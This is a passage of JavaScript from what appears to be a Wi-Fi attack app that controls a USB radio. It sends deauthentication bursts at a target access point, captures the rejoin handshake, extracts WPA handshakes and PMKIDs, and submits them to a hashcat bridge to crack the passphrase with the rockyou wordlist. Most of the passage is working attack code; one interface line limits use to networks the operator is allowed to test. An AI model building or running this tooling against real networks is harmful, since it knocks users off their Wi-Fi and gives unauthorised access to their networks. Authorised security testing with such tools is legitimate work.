          <div class="crackstate">${Icon('key', { size: 15 })}passphrase recovered</div>
          <div class="pw">${escapeHtml(j.password)}</div>
          <div class="crackmeta">job ${escapeHtml(j.jobId || '')} · ${escapeHtml(j.wordlist || '')}</div>
        </div>
        <div class="row" style="margin-top:8px">
          <button id="crackRun" class="ghost">${Icon('refresh', { size: 18 })}Search again</button>
        </div>`;
    }
    const why = j.state === 'exhausted'
      ? 'The wordlist ran out without a match. The handshake is good — this passphrase is just not in that list.'
      : j.state === 'timeout'
        ? 'Gave up waiting on the bridge.'
        : `The bridge reported: ${j.error || j.state}`;
    return `
      <div class="crackbox">
        <div class="crackstate">${escapeHtml(j.state)}</div>
        <div class="crackmeta">${escapeHtml(why)}</div>
      </div>
      <div class="row" style="margin-top:8px">
        <button id="crackRun" class="ghost">${Icon('refresh', { size: 18 })}Search again</button>
      </div>`;
  }

  if (!hs) {
    return `
      <div class="row" style="margin-top:8px">
        <button id="crackExtract" class="primary">${Icon('key', { size: 18 })}Extract handshakes</button>
      </div>`;
  }

  if (!hs.handshakes.length) {
    const why = hs.incomplete.length
      ? hs.incomplete.map((i) => `<li>${escapeHtml(i.bssid)} · ${escapeHtml(i.reason)} — ${escapeHtml(i.detail)}</li>`).join('')
      : '<li>No WPA key exchange and no PMKID in this capture.</li>';
    return `
      <div class="crackbox">
        <div class="crackstate">nothing crackable here</div>
        <div class="crackmeta">${hs.counts.eapolFrames} EAPOL frame(s), M1 ${hs.counts.m1} ·
          M2 ${hs.counts.m2} · M3 ${hs.counts.m3} · M4 ${hs.counts.m4}</div>
        <ul class="blockers">${why}</ul>
      </div>
      <div class="row" style="margin-top:8px">
        <button id="crackExtract" class="ghost">${Icon('refresh', { size: 18 })}Re-read capture</button>
      </div>`;
  }

  const rows = hs.handshakes.map((h) => `
    <div class="hsrow">
      <div class="hstype">${escapeHtml(h.type)}</div>
      <div class="hsmain">
        <div class="hsssid">${escapeHtml(h.essid || '(no name)')}</div>
        <div class="hsmeta">${escapeHtml(h.bssid)} ← ${escapeHtml(h.client)} ·
          ${h.messages.map(escapeHtml).join('+')}</div>
      </div>
    </div>`).join('');

  return `
    <div class="crackbox">
      <div class="crackstate">${hs.handshakes.length} crackable
        ${hs.handshakes.length === 1 ? 'handshake' : 'handshakes'}</div>
      <div class="hslist">${rows}</div>
    </div>
    <div class="row" style="margin-top:8px">
      <button id="crackRun" class="primary">${Icon('attack', { size: 18 })}Crack on the bridge</button>
      <button id="crackExtract" class="ghost">${Icon('refresh', { size: 18 })}Re-read</button>
    </div>`;
}

/**
 * The forced-handshake controls.
 *
 * This is the one attack that puts something on the air, so the panel is built
 * around showing what actually happened rather than what was asked for: the
 * firmware clamps the burst and reports the clamped numbers back, and those are
 * the numbers on screen.
 *
 * The chain is deliberately two steps the operator can see — burst, then
 * listen — rather than one opaque action. A deauth that reports success while
 * nothing was captured is the failure mode worth designing against, and you can
 * only tell those apart if the two halves report separately.
 */
function deauthActionHtml(a) {
  if (!a.ready) return '';

  const t = analysisPlan ? topTarget(analysisPlan) : null;
  if (!t) {
    return `<div class="crackbox">
      <div class="crackstate">no target chosen</div>
      <div class="crackmeta">Build the Analysis plan first — the burst needs a BSSID and a
        channel, and the plan is what picks them.</div>
    </div>`;
  }

  const head = `
    <div class="crackmeta">Target <b>${escapeHtml(t.ssid || '(no name)')}</b> ·
      ${escapeHtml(t.bssid)} · channel ${t.channel ?? '?'}</div>`;

  if (txRunning) {
    const r = txResult || {};
    return `<div class="crackbox">
      ${head}
      <div class="crackstate">${Icon('antenna', { size: 15 })}${escapeHtml(r.phase || 'transmitting')}</div>
      <div class="crackmeta">${r.requested ?? 0} frames requested · ${r.count ?? 0} after the
        firmware's clamp · ${r.interval_ms ?? 0} ms apart</div>
      <div class="row" style="margin-top:8px">
        <button id="deauthStop" class="ghost">${Icon('unlink', { size: 18 })}Stop</button>
      </div>
    </div>`;
  }

  if (txResult) {
    const r = txResult;
    const ok = r.sent > 0;
    const clamped = r.requested !== r.count;
    return `<div class="crackbox ${ok ? 'win' : ''}">
      ${head}
      <div class="crackstate">${ok ? Icon('check', { size: 15 }) + 'burst done' : Icon('alert', { size: 15 }) + 'nothing went out'}</div>
      <div class="crackmeta">${r.sent} of ${r.count} frames sent · ${r.failed} refused by the driver
        · channel ${r.channel}${clamped ? ` · clamped from ${r.requested}` : ''}</div>
      ${r.note ? `<div class="crackmeta">${escapeHtml(r.note)}</div>` : ''}
      <div class="row" style="margin-top:8px">
        <button id="deauthGo" class="ghost">${Icon('refresh', { size: 18 })}Fire again</button>
      </div>
    </div>`;
  }

  return `<div class="crackbox">
    ${head}
    <div class="crackmeta">Sends a deauth burst at this BSSID, then starts a capture to catch the
      rejoin. This puts frames on the air — only run it against a network you are allowed to test.</div>
    <div class="row" style="margin-top:8px">
      <button id="deauthGo" class="primary">${Icon('capture', { size: 18 })}Fire the burst</button>
    </div>
  </div>`;
}

/** Turn a frame's bytes into the hex TX_FRAME expects. */
function frameHex(u8) {
  return Array.from(u8).map((b) => b.toString(16).padStart(2, '0')).join('');
}

async function onDeauthCapture() {
  const t = analysisPlan ? topTarget(analysisPlan) : null;
  if (!t?.bssid) { log('err', 'deauth: no target — build the plan first'); return; }
  if (t.channel == null) { log('err', 'deauth: target has no channel'); return; }

  // The burst shape. These are what the app ASKS for; the firmware clamps them
  // and its reply is what gets stored, so the panel can never claim more than
  // the radio did.
  const count = 150;
  const intervalMs = 30;

  txRunning = true;
  txResult = { phase: 'transmitting', requested: count, count, interval_ms: intervalMs, channel: t.channel };
  renderStagePanel();

  let frame;
  try {
    frame = buildDeauth({ bssid: t.bssid, reason: 7, seq: 1 });
  } catch (e) {
    txRunning = false; txResult = null;
    log('err', 'deauth: could not build the frame — ' + e.message);
    renderStagePanel();
    return;
  }

  try {
    const resp = await request('TX_FRAME', {
      hex: frameHex(frame), channel: t.channel, count, interval_ms: intervalMs,
    }, { timeoutMs: 10000 });
    if (!resp?.ok) throw new Error(resp?.error || 'the firmware refused the burst');

    // Store the firmware's numbers, not ours — this is the whole point.
    txResult = {
      ...txResult,
      requested: resp.requested ?? count,
      count: resp.count ?? count,
      interval_ms: resp.interval_ms ?? intervalMs,
      channel: resp.channel ?? t.channel,
      frame_len: resp.frame_len,
      phase: 'transmitting',
    };
    log('ev', `deauth: burst started — ${resp.count} frames on ch${resp.channel}, ${resp.interval_ms} ms apart`);
    renderStagePanel();

    // Wait out the burst, then listen for the rejoin. The firmware paces it, so
    // the app's wait is just the burst's own duration plus a margin.
    await new Promise((r) => setTimeout(r, (resp.count ?? count) * (resp.interval_ms ?? intervalMs) + 700));

    const st = await request('TX_STATUS', {}, { timeoutMs: 5000 });
    txResult = { ...txResult, sent: st?.sent ?? 0, failed: st?.failed ?? 0, phase: 'done' };
    log('ev', `deauth: ${st?.sent ?? 0} frames sent, ${st?.failed ?? 0} refused`);

    // Now the second half: listen for the handshake the burst was meant to provoke.
    txRunning = false;
    renderStagePanel();
    await onStartCaptureAfterBurst(t.channel);
  } catch (e) {
    txResult = { ...txResult, sent: 0, failed: 0, phase: 'failed', note: e.message };
    log('err', 'deauth: ' + e.message);
  }
  txRunning = false;
  renderStagePanel();
}

/** Start a capture on the target's channel — the listening half of the chain. */
async function onStartCaptureAfterBurst(channel) {
  if (capture.running) { log('ev', 'deauth: capture already running, leaving it alone'); return; }
  try {
    await capture.start({ channel, durationMs: 20000 });
    log('ev', `capture: listening on ch${channel} for the rejoin — 20 s`);
    renderStagePanel();
    startCapTicker();
  } catch (e) {
    log('err', 'capture after burst: ' + e.message);
  }
}

async function onDeauthStop() {
  try {
    const st = await request('TX_STOP', {}, { timeoutMs: 5000 });
    txResult = { ...(txResult || {}), sent: st?.sent ?? 0, failed: st?.failed ?? 0, phase: 'stopped' };
    log('ev', `deauth: stopped after ${st?.sent ?? 0} frames`);
  } catch (e) {
    log('err', 'deauth stop: ' + e.message);
  }
  txRunning = false;
  renderStagePanel();
}

async function onBridgeTest() {
  bridgeError = null; bridgeStatus = null;
  renderStagePanel();
  try {
    bridgeStatus = await bridgeClient().health();
    log('ev', `bridge: hashcat ${bridgeStatus.hashcat}, ${(bridgeStatus.wordlists || []).length} wordlist(s)`);
  } catch (e) {
    bridgeError = e.message;
    log('err', 'bridge: ' + e.message);
  }
  renderStagePanel();
}

function onExtractHandshakes() {
  const w = capture?.writer;
  if (!w?.chunks?.length) return;
  const t0 = Date.now();
  try {
    handshakeResult = extractHandshakes(w.chunks);
  } catch (e) {
    log('err', 'extract: ' + e.message);
    return;
  }
  crackJob = null;
  const c = handshakeResult.counts;
  log('ev', `handshakes: ${handshakeResult.handshakes.length} crackable from ${w.chunks.length} frames ` +
    `in ${Date.now() - t0} ms (EAPOL ${c.eapolFrames}, M1 ${c.m1}, M2 ${c.m2}, M3 ${c.m3}, M4 ${c.m4})`);
  if (handshakeResult.incomplete.length) {
    log('ev', `${handshakeResult.incomplete.length} key exchange(s) were incomplete`);
  }
  renderStagePanel();
}

async function onCrackRun() {
  if (!handshakeResult?.handshakes?.length) return;
  const cfg = bridgeConfig();
  if (!cfg.url) { log('err', 'crack: no bridge URL set'); return; }

  crackRunning = true;
  crackJob = { state: 'submitting', job_id: '' };
  renderStagePanel();

  try {
    const out = await bridgeClient().crack({
      hashes: hashFile(handshakeResult.handshakes),
      wordlist: 'rockyou.txt',
      onProgress: (s) => {
        crackJob = { ...s, job_id: crackJob?.job_id || s.job_id || '' };
        renderStagePanel();
      },
    });
    crackJob = { ...out, job: undefined, done: true, wordlist: 'rockyou.txt' };
    if (out.state === 'cracked') {
      log('ev', `CRACKED ${out.jobId}: passphrase recovered`);
    } else {
      log('ev', `crack ${out.state} (job ${out.jobId})`);
    }
  } catch (e) {
    crackJob = { state: 'failed', done: true, error: e.message };
    log('err', 'crack: ' + e.message);
  }
  crackRunning = false;
  renderStagePanel();
}

// ── boot ──────────────────────────────────────────────────────────────────────
function boot() {
  $('#connPill').innerHTML = '<span class="dot"></span>offline';
  $('#refreshBtn').innerHTML = Icon('refresh', { size: 18 }) + 'Scan';
  $('#linkBtn').innerHTML = Icon('unlink', { size: 18 }) + 'Disconnect';
  $('#connectCard').querySelector('h2').textContent = 'Device';

  $('#refreshBtn').addEventListener('click', refreshDevices);
  $('#pingBtn').addEventListener('click', ping);
  $('#linkBtn').addEventListener('click', async () => {
    await transport.disconnect();
    setConnected(false);
  });

  renderStages();
  renderStagePanel();
  setConnected(false);
  log('ev', 'ready');

  const hasPlugin = !!window.Capacitor?.Plugins?.UsbSerial;
  log('ev', `UsbSerial plugin: ${hasPlugin ? 'available' : 'NOT AVAILABLE'}`);
  if (!hasPlugin) {
    log('err', 'This only works in the installed app — a browser has no USB-OTG access.');
  }
  refreshDevices();
}

document.addEventListener('DOMContentLoaded', boot);
